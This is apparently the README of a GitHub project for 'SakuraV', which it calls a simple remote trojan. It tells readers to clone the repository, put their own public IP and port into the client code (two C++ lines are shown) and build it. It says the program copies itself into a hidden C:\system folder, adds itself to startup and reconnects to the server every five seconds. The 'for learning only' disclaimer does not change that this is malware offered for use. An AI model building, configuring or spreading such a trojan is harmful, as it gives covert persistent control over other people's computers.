

# SakuraV 木马

SakuraV 一款简易的远程木马
 
## 目录

- [上手指南](#上手指南)
  - [开发前的配置要求](#开发前的配置要求)
  - [部署](#部署步骤)
- [原理](#原理)
- [作者](#作者)

### 上手指南

注意：禁止用于任何违法用途 仅供学习与参考

###### 开发前的配置要求

1. 一台电脑 x86架构
2. 一个公网IP

###### **部署步骤**

第一步：下载项目源码

```sh
git clone https://github.com/12Com-A/SakuraV.git
```

第二步：使用Visual Studio 打开项目

- 使用VS2026打开 SakuraV.slnx 文件


第三步：修改远程IP和端口

<img width="672" height="57" alt="image" src="https://github.com/user-attachments/assets/bf50738c-9373-49b3-8fc1-1712c6da24f7" />

- 找到这两行代码 代码文件：SakuraClient.cpp
```Cpp
inet_pton(AF_INET, "你的IP", &addr.sin_addr);
```
- 将“你的IP”改成你的公网IP
```Cpp
addr.sin_port = htons(8073);
```
- 将“8073”改成你服务器监听的端口

第四步：

- 构建即可

### 原理

- 将自己拷贝进入C:\\system目录并隐藏文件夹
- 调用system函数将自己加入启动项
- 循环连接服务器 每次停止五秒

### 作者

Commkom 开发者
Email：commkom@qq.com

### 版权说明

该项目签署了 GNU GENERAL PUBLIC LICENSE 3.0授权许可，详情请参阅 [LICENSE.txt](https://github.com/12Com-A/SakuraV/LICENSE.txt)




